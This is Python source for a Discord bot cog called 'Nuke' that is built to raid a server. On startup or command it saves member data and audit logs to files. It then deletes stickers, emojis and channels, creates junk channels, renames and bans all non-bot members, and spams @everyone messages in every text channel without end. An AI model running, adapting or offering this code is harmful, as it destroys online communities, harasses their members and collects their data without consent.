from discord.ext import commands
from discord import app_commands

import discord
import asyncio

from config import environ

from colorama import init
import colorama
import random
import string
import time
import json
import requests
import os

lock = asyncio.Lock()

class Nuke(commands.Cog):
    def __init__(self, client:commands.Bot, *args , **kwargs):
        super(Nuke, self).__init__(*args, **kwargs)
        self.client = client

        self.channels_to_spam = []
        self.guild = None

        if self.client.guilds[::] != []:
            self.guild = self.client.guilds[0]

        if environ["config"]["commands"]["command_for_kill"] == False or environ["config"]["commands"]["command_for_kill"] == False and environ["config"]["commands"]["command"] == "":
            asyncio.ensure_future(self.nuke_method())

    @commands.command(name = environ["config"]["commands"]["command"])
    async def nuke_command(self, ctx: commands.Context):
        print(f"{colorama.Fore.CYAN}[CDisTech]{colorama.Fore.GREEN} Nuke has started")

        asyncio.ensure_future(self.nuke_method())

    async def nuke_method(self,*args):

        if environ["config"]["info"]["info_status"]:
            await self.collectInforamtion()
        
        else:
            print(f"{colorama.Fore.CYAN}[CDisTech]{colorama.Fore.GREEN} Info collector is off")

        if self.guild:
            tasks = [
                    self.delStickers,
                    self.delEmojis,
                    self.delChannels,
                    self.createNastyTextChannels,
                    self.createNastyVoiceChannels,
                    self.membersActions,
                    self.spamChats
                    ]

            for task in tasks:
                asyncio.create_task(task())
            
        else:
            print(f"{colorama.Fore.CYAN}[CDisTech]{colorama.Fore.RED} The bot doesn't have a any guild")
            
    # info collector
    async def collectInforamtion(self):
        await lock.acquire()

        if not os.path.exists(f"././files/server_info/{self.guild.name}"):
            os.makedirs(f"./files/server_info/{self.guild.name}")

        tasks = [
            self.lastScreen,
            self.memberCollector,
            self.auditlogCollector
        ]
        for task in tasks:
            await task()
        
        lock.release()

    async def lastScreen(self):
        last_screen = {"guild_info":{
            "id":self.guild.id,
            "name":self.guild.name,
            "avatar":self.guild.icon.url if self.guild.icon else None,
            "banner": self.guild.banner.url if self.guild.banner else None,

        }, "channels":{}}

        for channel in self.guild.channels:
            last_screen["channels"][str(channel.id)] = {
                "type":str(channel.type),
                "name":channel.name,
                "id":channel.id,
                "position":channel.position,
                "overwrites":channel.overwrites,
                "nsfw":channel.nsfw,
            }
        
        with open(f"./files/server_info/{self.guild.name}/guild.json", "w+") as guild_file:
            guild_file.write(json.dumps(last_screen, indent= 4))
            guild_file.close()
        print(f"{colorama.Fore.CYAN}[CDisTech]{colorama.Fore.GREEN} Last screen have been made")

    async def memberCollector(self):
        members = {}

        for member in self.guild.members:
            members[f"{member.id}"] = {
                "name":member.display_name,
                "avatar": member.avatar.url if member.avatar else None,
                "banner": member.banner.url if member.banner else None,
                "id": member.id
            }
        
        with open(f"./files/server_info/{self.guild.name}/members.json", "w+") as member_file:
            member_file.write(json.dumps(members, indent= 4))
            member_file.close()
        
        print(f"{colorama.Fore.CYAN}[CDisTech]{colorama.Fore.GREEN} Last screen has been collected")

    async def auditlogCollector(self):
        
        audit_logs = {}

        async for audit_log in self.guild.audit_logs(limit= environ["config"]["info"]["audit_log_limit"]):
            audit_log:discord.AuditLogEntry

            audit_logs[f"{audit_log.id}"] = {
                "user":audit_log.user.display_name,
                "user_id":audit_log.user_id,
                "target":audit_log.target.id,
                "reason":audit_log.reason,
                "changes":str(audit_log.changes.after)
            }

        with open(f"./files/server_info/{self.guild.name}/audit_logs.json", "w+") as audit_log_file:
            audit_log_file.write(json.dumps(audit_logs, indent= 4))
            audit_log_file.close()
        
        print(f"{colorama.Fore.CYAN}[CDisTech]{colorama.Fore.GREEN} Audit logs have been collected")
        


    # nuke functions

    async def delStickers(self):
        if environ["config"]["nasties"]["nasties_status"] and environ["config"]["nasties"]["del_stickers"]:
            try:
                for sticker in self.guild.stickers:
                    await sticker.delete()
                    print(f"{colorama.Fore.CYAN}[Stickers]{colorama.Fore.GREEN} Sticker {sticker.name} ({sticker.id}) has been deleted")
            except:
                print(f"{colorama.Fore.CYAN}[Stickers]{colorama.Fore.RED} No permissions to do this")

    async def delEmojis(self):
        if environ["config"]["nasties"]["nasties_status"] and environ["config"]["nasties"]["del_emojis"]:
            try:
                for emoji in self.guild.emojis:
                    await emoji.delete()
                    print(f"{colorama.Fore.CYAN}[Emojis]{colorama.Fore.GREEN} Sticker {emoji.name} ({emoji.id}) has been deleted")
            except:
                print(f"{colorama.Fore.CYAN}[Emojis]{colorama.Fore.RED} No permissions to do this")
            
    async def delChannels(self):
        if environ["config"]["nasties"]["nasties_status"]:
            channels = self.client.get_all_channels()

            for channel in channels:
                # del chats
                if isinstance(channel, discord.TextChannel) and environ["config"]["nasties"]["del_chats"] and channel not in self.channels_to_spam:
                    try:
                        print(f"{colorama.Fore.YELLOW}[Channel]{colorama.Fore.GREEN} Channel {channel} has been deleted")
                        await channel.delete()
                    
                    except:
                        print(f"{colorama.Fore.YELLOW}[Channel]{colorama.Fore.GREEN} Channel {channel} has been deleted")
                
                # del categories
                elif isinstance(channel, discord.CategoryChannel) and environ["config"]["nasties"]["del_categories"] and channel not in self.channels_to_spam:
                    try:
                        print(f"{colorama.Fore.YELLOW}[Channel]{colorama.Fore.GREEN} Category {channel} has been deleted")
                        await channel.delete()
                    
                    except:
                        print(f"{colorama.Fore.YELLOW}[Channel]{colorama.Fore.GREEN} Category {channel} has been deleted")
                
                # del voices
                elif isinstance(channel, discord.VoiceChannel) and environ["config"]["nasties"]["del_voices"] and channel not in self.channels_to_spam:
                    try:
                        print(f"{colorama.Fore.YELLOW}[Channel]{colorama.Fore.GREEN} Voice channel {channel} has been deleted")
                        await channel.delete()
                    
                    except:
                        print(f"{colorama.Fore.YELLOW}[Channel]{colorama.Fore.GREEN} Voice channel {channel} has been deleted")

    async def createNastyTextChannels(self):
        if (environ["config"]["nasties"]["nasties_status"] and environ["config"]["nasties"]["create_nasty_chats"]):

            if environ["config"]["nasties"]["random_name_of_nasty_chats"] and environ["config"]["nasties"]["names_of_nasty_chats"] == []:
                count = random.randint(5,10)

                for x in range(2,count):
                    name = "".join(random.choice(list(string.ascii_letters+ string.ascii_uppercase)) for x in range(0,random.randint(5,20)))

                    channel = await self.guild.create_text_channel(name)
                    print(f"{colorama.Fore.RED}[BadChannel]{colorama.Fore.GREEN} Channel {channel} has been created")
                    self.channels_to_spam.append(channel)
            
            elif environ["config"]["nasties"]["random_name_of_nasty_chats"] == False and environ["config"]["nasties"]["create_nasty_chats"] and environ["config"]["nasties"]["names_of_nasty_chats"] == []:
                count = random.randint(5,10)

                for x in range(2,count):
                    channel = await self.guild.create_text_channel("Nasty text channel")
                    print(f"{colorama.Fore.RED}[BadChannel]{colorama.Fore.GREEN} Channel {channel} has been created")
                    self.channels_to_spam.append(channel)

            
            else:
                for name in environ["config"]["nasties"]["names_of_nasty_chats"]:
                    channel = await self.guild.create_text_channel(name)
                    print(f"{colorama.Fore.RED}[BadChannel]{colorama.Fore.GREEN} Channel {channel} has been created")
                    self.channels_to_spam.append(channel)

    async def createNastyVoiceChannels(self):
        if (environ["config"]["nasties"]["nasties_status"] and environ["config"]["nasties"]["create_nasty_voices"]):

            if environ["config"]["nasties"]["random_name_of_nasty_voices"] and environ["config"]["nasties"]["names_of_nasty_voices"] == [] and environ["config"]["nasties"]["names_of_nasty_voices"] == []:
                count = random.randint(5,10)


                for x in range(2,count):
                    name = "".join(random.choice(list(string.ascii_letters+ string.ascii_uppercase)) for x in range(0,random.randint(5,20)))

                    channel = await self.guild.create_voice_channel(name, user_limit=1)
                    print(f"{colorama.Fore.RED}[BadChannel]{colorama.Fore.GREEN} Voice channel {channel} has been created")
                    self.channels_to_spam.append(channel)
            
            elif environ["config"]["nasties"]["random_name_of_nasty_voices"] == False and environ["config"]["nasties"]["create_nasty_voices"]:
                count = random.randint(5,10)
                
                for x in range(2,count):
                    channel = await self.guild.create_voice_channel("Nasty voice channel")
                    print(f"{colorama.Fore.RED}[BadChannel]{colorama.Fore.GREEN} Voice channel {channel} has been created")
                    self.channels_to_spam.append(channel)
            
            else:
                for name in environ["config"]["nasties"]["names_of_nasty_voices"]:
                    channel = await self.guild.create_voice_channel(name , user_limit= 1)
                    print(f"{colorama.Fore.RED}[BadChannel]{colorama.Fore.GREEN} Voice channel {channel} has been created")
                    self.channels_to_spam.append(channel)

    async def membersActions(self):
        for member in self.client.get_all_members():
            if environ["config"]["nasties"]["nasties_status"]:

                if environ["config"]["nasties"]["anonymisation_member"]:
                    if environ["config"]["nasties"]["anonymisation_nick"] != "":
                        try:
                            await member.edit(nick = environ["config"]["nasties"]["anonymisation_nick"])
                            print(f"{colorama.Fore.RED}[Renaming]{colorama.Fore.GREEN} User {member.display_name} ({member.id}) has been renamed")
                        except:
                            print(f"{colorama.Fore.RED}[Renaming]{colorama.Fore.GREEN} User has not renamed,  {member.display_name} ({member.id}) have more permissions that bot")
                    
                    elif environ["config"]["nasties"]["anonymisation_member"] and environ["config"]["nasties"]["anonymisation_nick"] == "":
                        try:
                            name = "".join(random.choice(list(string.ascii_letters+ string.ascii_uppercase)) for x in range(0,random.randint(5,20)))

                            await member.edit(nick = name)
                            print(f"{colorama.Fore.RED}[Renaming]{colorama.Fore.GREEN} User {member.display_name} ({member.id}) has been renamed")
                        except:
                            print(f"{colorama.Fore.RED}[Renaming]{colorama.Fore.GREEN} User has not renamed,  {member.display_name} ({member.id}) have more permissions that bot")
                    
                    else:
                        try:
                            name = "CDisTech crash bot"

                            await member.edit(nick = name)
                            print(f"{colorama.Fore.RED}[Renaming]{colorama.Fore.GREEN} User {member.display_name} ({member.id}) has been renamed")
                        except:
                            print(f"{colorama.Fore.RED}[Renaming]{colorama.Fore.GREEN} User has not renamed,  {member.display_name} ({member.id}) have more permissions that bot")
            
                if environ["config"]["nasties"]["ban_members"]:
                    try:
                        if member.bot == False:
                            await member.ban(reason= environ["config"]["ban_reason"])
                            print(f"{colorama.Fore.RED}[BAN]{colorama.Fore.GREEN} User {member.display_name} ({member.id}) has been banned")
                        
                    except:
                        print(f"{colorama.Fore.RED}[BAN]{colorama.Fore.GREEN} User has not banned , {member.display_name} ({member.id}) have more permissions that bot")

    async def spamChats(self):
        if environ["config"]["nasties"]["nasties_status"] and environ["config"]["nasties"]["spam"]:
            while True:
                for channel in self.guild.channels:
                    try:
                        async def createTaskForSpam(channel:discord.TextChannel):
                            link_everyone = environ["config"]["nasties"]["link_everyone"]

                            if environ["config"]["nasties"]["messages_for_spam"] != []:
                                for x in environ["config"]["nasties"]["messages_for_spam"]:
                                    await channel.send(content= f"@everyone "+ x  if link_everyone else x)
                                    print(f"{colorama.Fore.LIGHTWHITE_EX}[Messager spam]{colorama.Fore.GREEN} Message has been send")
                            
                            else:
                                x = "".join(random.choice(list(string.ascii_letters+string.ascii_uppercase) for x in range(5, random.randint(20,40))))
                                await channel.send(content= f"@everyone "+ x  if link_everyone else x)
                                print(f"{colorama.Fore.LIGHTWHITE_EX}[Messager spam]{colorama.Fore.GREEN} Message has been send")
                                                
                        if isinstance(channel , discord.TextChannel):
                            asyncio.create_task(createTaskForSpam(channel))
                    except Exception as a:
                        print(f"{colorama.Fore.LIGHTWHITE_EX}[Messager error] Channel with message spam was deleted")
                
                await asyncio.sleep(0.5)
                





async def setup(self:commands.Bot):
    await self.add_cog(Nuke(client = self))